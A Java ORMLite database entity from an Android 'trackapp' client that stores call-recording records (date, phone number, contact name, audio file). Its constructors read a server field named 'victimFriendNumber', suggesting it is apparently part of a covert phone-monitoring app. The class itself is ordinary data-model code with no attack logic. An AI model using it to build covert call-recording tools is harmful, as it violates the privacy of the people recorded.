package com.sunnet.trackapp.client.db.entity;

import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;
import com.sunnet.trackapp.client.db.dao.CallVoiceDao;
import com.sunnet.trackapp.client.task.response.StatisticalResponse;
import com.sunnet.trackapp.client.util.CryptoUtils;
import com.sunnet.trackapp.client.util.Utils;

/**
 * All software created will be owned by
 * Patient Doctor Technologies, Inc. in USA
 */
@DatabaseTable(tableName = CallVoiceEntity.TABLE_NAME, daoClass = CallVoiceDao.class)
public class CallVoiceEntity extends BaseEntity {
    public static final String TABLE_NAME = "CallVoice";

    public static final String ID_COL = "ID_COL";
    public static final String DATE_COL = "DATE_COL";
    public static final String PHONE_NUMBER_COL = "PHONE_NUMBER_COL";
    public static final String PHONE_NAME_COL = "PHONE_NAME_COL";
    public static final String AUDIO_COL = "AUDIO_COL";

    public CallVoiceEntity() {
    }

    public CallVoiceEntity(StatisticalResponse.Result.SmsAndRecorder parent, StatisticalResponse.Result.SmsAndRecorder.Recorder recorder) {
        this.id = recorder.id;
        this.date = Utils.getDateFormat(recorder.timeStamp);
        this.phoneNumber = parent.victimFriendNumber;
        this.phoneName = parent.victimFriendNumber;
        this.audio = recorder.fileName;
    }

    public CallVoiceEntity(String victimFriendNumber, StatisticalResponse.Result.SmsAndRecorder.Recorder recorder) {
        this.id = recorder.id;
        this.date = Utils.getDateFormat(recorder.timeStamp * 1000);
        this.phoneNumber = victimFriendNumber;
        this.phoneName = victimFriendNumber;
        this.audio = recorder.fileName;
    }

    public CallVoiceEntity(String id, String date, String phoneNumber, String phoneName, String audio) {
        this.id = id;
        this.date = date;
        this.phoneNumber = phoneNumber;
        this.phoneName = phoneName;
        this.audio = audio;
    }

    @DatabaseField(columnName = ID_COL, canBeNull = false, id = true)
    private String id;
    @DatabaseField(columnName = DATE_COL)
    private String date;
    @DatabaseField(columnName = PHONE_NUMBER_COL)
    private String phoneNumber;
    @DatabaseField(columnName = PHONE_NAME_COL)
    private String phoneName;
    @DatabaseField(columnName = AUDIO_COL)
    private String audio;

    public String getId() {
        return id;
    }

    public void setId(String id) {
        this.id = id;
    }

    public String getDate() {
        return date;
    }

    public void setDate(String date) {
        this.date = date;
    }

    public String getPhoneNumber() {
        return phoneNumber;
    }

    public void setPhoneNumber(String phoneNumber) {
        this.phoneNumber = phoneNumber;
    }

    public String getPhoneName() {
        return phoneName;
    }

    public void setPhoneName(String phoneName) {
        this.phoneName = phoneName;
    }

    public String getAudio() {
        return audio;
    }

    public void setAudio(String audio) {
        this.audio = audio;
    }

    public void decrypt() {
        phoneNumber = CryptoUtils.decryptReturnValueWhenError(phoneNumber);
        phoneName = CryptoUtils.decryptReturnValueWhenError(phoneName);
    }

    @Override
    public String toString() {
        return "CallVoiceEntity{" +
                "id='" + id + '\'' +
                ", date='" + date + '\'' +
                ", phoneNumber='" + phoneNumber + '\'' +
                ", phoneName='" + phoneName + '\'' +
                ", audio='" + audio + '\'' +
                '}';
    }

}
